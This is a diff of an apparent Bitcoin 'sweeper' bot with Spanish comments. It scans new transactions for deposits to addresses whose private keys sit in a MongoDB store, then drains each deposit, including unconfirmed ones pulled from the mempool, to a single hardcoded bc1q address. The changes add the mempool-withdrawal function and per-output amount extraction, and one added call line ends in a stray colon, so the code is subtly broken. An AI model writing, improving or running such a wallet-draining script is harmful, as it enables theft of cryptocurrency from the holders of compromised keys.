@@ -2,6 +2,7 @@ import os
 import hashlib
 import requests
 import json
+from decimal import Decimal
 from requests.auth import HTTPBasicAuth
 
 import time
@@ -161,7 +162,7 @@ def get_transaction_addresses(txid=None, mode="vout"):
 
     :param txid: ID de la transacción (txid)
     :param mode: "vin" para direcciones que envían, "vout" para direcciones que reciben
-    :return: Lista de direcciones en función del modo seleccionado
+    :return: Lista de direcciones y cantidades en función del modo seleccionado
     """
     if not txid:
         return {"error": "Debe proporcionar un txid válido."}
@@ -182,22 +183,18 @@ def get_transaction_addresses(txid=None, mode="vout"):
         if not transaction_info:
             return []
 
-        if mode == "vin":
-            # Procesar direcciones de entrada (vin) - aunque no se tiene acceso directo a las direcciones de entrada
-            vin_addresses = []
-            for vin in transaction_info.get('vin', []):
-                # Las entradas generalmente no contienen direcciones directas, pero se puede obtener el txid y vout.
-                # Es necesario obtener más información de la transacción anterior si es necesario.
-                vin_addresses.append(vin.get('txid'))  # Aquí sólo guardamos el txid de las entradas
-            return vin_addresses
-
-        elif mode == "vout":
-            # Procesar direcciones de salida (vout)
+        if mode == "vout":
+            # Procesar direcciones de salida (vout) y valores
             vout_addresses = []
             for vout in transaction_info.get('vout', []):
                 address = vout.get('scriptPubKey', {}).get('address')  # Extraemos la dirección directamente de 'address'
-                if address:
-                    vout_addresses.append(address)
+                value = vout.get('value')  # Extraemos el valor de la transacción
+                vout_index = vout.get('n')  # Extraemos el vout_index
+                if address and value and vout_index is not None:
+                    # Convertimos el valor a flotante y lo redondeamos a 8 decimales
+                    formatted_value = round(value, 8)
+                    vout_addresses.append({"address": address, "value": formatted_value, "vout_index": vout_index})
+
 
             return vout_addresses
 
@@ -225,6 +222,7 @@ def get_mempool_transactions():
         print(f"Error fetching mempool transactions: {e}")
         return False
 
+
 # Función para enviar todos los fondos
 def send_all_funds(privateKeyWIF, destination_address):
     # Crear una clave a partir de la clave privada en formato WIF
@@ -236,55 +234,71 @@ def send_all_funds(privateKeyWIF, destination_address):
     fee_increment = 1  # Incremento del fee en satoshis por byte (aumenta 1 satoshi por cada transacción)
     current_fee = normal_fee  # Iniciar con el fee normal en satoshis
 
-    while True:
-        # Verificar el saldo disponible
-        balance = key.get_balance('btc')
-        print(f"Saldo disponible: {balance} BTC")
-        
-        try:
-            # Asegurarse de que balance es un número flotante
-            balance = float(balance)
-        except ValueError:
-            print("Error: El saldo no es un número válido.")
-            return
+    try:
 
-        # Si no hay saldo, salimos del bucle
-        if balance <= 0:
-            print("No hay fondos disponibles para enviar.")
-            break  # Sale del bucle while si se cumple la condición
+        # Generar la transacción sin especificar cantidad, solo dejando que el saldo restante se envíe a la dirección de destino
+        tx = key.create_transaction([], leftover=destination_address, replace_by_fee=True, absolute_fee=True, fee=current_fee)
 
-        try:
-            # Crear la transacción con la tarifa configurada
-            tx = key.create_transaction([], leftover=destination_address, replace_by_fee=False, absolute_fee=True, fee=current_fee)
+        # Enviar la transacción
+        tx_id = key.send_transaction(tx)
 
-            # Verificar que la transacción fue exitosa
-            if tx:
-                print(f"Transacción creada con éxito: {tx} : Fee: {current_fee}")
-                # Confirmamos que el saldo ha cambiado y no hay fondos disponibles
-                balance = key.get_balance('btc')  # Actualizamos el saldo
-                print(f"Saldo actualizado: {balance} BTC")
+        # Verificar que la transacción fue exitosa
+        if tx_id:
+            print(f"Transacción creada con éxito: {tx_id} : Fee: {current_fee}")
 
-                # Incrementar el fee después de cada transacción
-                if balance > 0:
-                    current_fee += fee_increment
-                    print(f"Nuevo fee: {current_fee} satoshis por byte")
+        else:
+            print("No se pudo crear la transacción, sin detalles de la respuesta.")
 
-            else:
-                print("No se pudo crear la transacción, sin detalles de la respuesta.")
-
-        except Exception as e:
-            print(f"Error al crear la transacción: {str(e)}")
-        
-        # Si el saldo se actualizó y se volvió cero, detenemos el bucle y restablecemos el fee
-        if balance <= 0:
-            print("Se han enviado todos los fondos disponibles.")
-            current_fee = normal_fee  # Restablecer el fee al valor normal
-            break  # Sale del bucle while si el saldo es 0
-
-        # Esperar 2 segundos antes de intentar nuevamente hasta que quede en 0 BTC
-        time.sleep(2)
+    except Exception as e:
+        print(f"Error al crear la transacción: {str(e)}")
 
 
+# Funcion para enviar los fondos que aun esta pendiente de confirmacion, asi creamos una transaccion de retiro
+def create_withdrawal_from_pending_tx(privateKeyWIF, destination_address, amount_BTC, txid, vout_index=0):
+    """
+    Crea y envía una transacción de retiro utilizando solo el txid de un depósito pendiente.
+
+    :param privateKeyWIF: Clave privada en formato WIF.
+    :param destination_address: Dirección de destino.
+    :param amount_BTC: Monto a enviar en BTC (debe ser un número decimal).
+    :param txid: ID de la transacción pendiente en la mempool.
+    :param vout_index: Índice de salida (por defecto, 0).
+    :return: Hash de la transacción enviada o mensaje de error.
+    """
+    try:
+        # Validar que el monto sea un número decimal
+        amount_BTC = Decimal(amount_BTC)
+        if amount_BTC <= 0:
+            print("El monto a enviar debe ser mayor que cero.")
+            pass
+
+        # Crear la clave privada
+        key = Key(privateKeyWIF)
+
+        # Crear el UTXO pendiente (valores obtenidos de la transacción pendiente)
+        pending_utxo = {
+            'txid': txid,
+            'vout': vout_index,
+            'amount': float(amount_BTC),  # El monto debe coincidir con el valor del UTXO
+            'script': key.script,        # Generado desde la clave privada
+            'confirmations': 0          # Especificamos que está pendiente
+        }
+
+        # Crear la transacción de retiro
+        tx = key.create_transaction(
+            [(destination_address, float(amount_BTC), 'btc')],
+            unspent=[pending_utxo]
+        )
+
+        # Enviar la transacción
+        tx_hash = NetworkAPI.broadcast_tx(tx)
+
+        print(f"Transacción enviada con éxito. Hash: {tx_hash}")
+        return tx_hash
+
+    except Exception as e:
+        print(f"Error al crear o enviar la transacción: {str(e)}")
+        return None
 
 
 # Función para generar direcciones y WIF
@@ -347,24 +361,31 @@ def procesar_bloque_y_transacciones():
 
         # del Txid sacamos las direcciones que estan recibiendo fondos (para)
         tx_direcciones = get_transaction_addresses(tx_hash)
-        for addr in tx_direcciones:
+        for addr_info in tx_direcciones:
 
-            # Verificamos que no este vacio, esto devuelve la direccion que tiene los tx y que la direccion comienze con 1
-            if addr and addr.startswith('1'): 
+            # Aseguramos que la información tenga ambos valores (dirección y valor)
+            if addr_info and 'address' in addr_info and 'value' in addr_info:
 
-                #print(f"[Buscando MONGODB] {addr} :: Txid: {tx_hash}") 
+                address = addr_info['address']
+                btcRecibido = addr_info['value'] # Cantidad de Bitcoin Recibido
+                getVoutIndex = addr_info['vout_index'] # Vout_index del deposito
 
-                # Buscar en MongoDB, si existe retiramos saldo
-                searchMongoDBWIF = buscar_wifMongoDB(addr)
-                if searchMongoDBWIF:
+                # Verificamos que no este vacio, esto devuelve la direccion que tiene los tx y que la direccion comienze con 1
+                if address and address.startswith('1'): 
 
-                    print(f"[Nueva Transaccion] {addr} :: {searchMongoDBWIF}")
+                    #print(f"[Buscando MONGODB] {address} :: Txid: {tx_hash}") 
 
-                    # Guardar la Wallet que se encontro con actividad reciente
-                    agregar_contenido_txt('actividadBTC.txt', f"{addr} :: {searchMongoDBWIF}")
+                    # Buscar en MongoDB, si existe retiramos saldo
+                    searchMongoDBWIF = buscar_wifMongoDB(address)
+                    if searchMongoDBWIF:
 
-                    # Realizar Retiro
-                    send_all_funds(searchMongoDBWIF, 'bc1q8t4v5k00njd494u6l96qd8n3rkqxdzfncgr6u3')
+                        print(f"[Nueva Transaccion] {address} :: {searchMongoDBWIF}")
+
+                        # Guardar la Wallet que se encontro con actividad reciente
+                        agregar_contenido_txt('ENCONTRADA_actividadBTC.txt', f"{address} :: {searchMongoDBWIF}")
+
+                        # realizar Retiro usando el txid del deposito que esta pendiente en la mempool
+                        create_withdrawal_from_pending_tx(searchMongoDBWIF, 'bc1q8t4v5k00njd494u6l96qd8n3rkqxdzfncgr6u3', btcRecibido, tx_hash, getVoutIndex):
 
 
         # Sleep a Cada Transaccion que se envia peticion
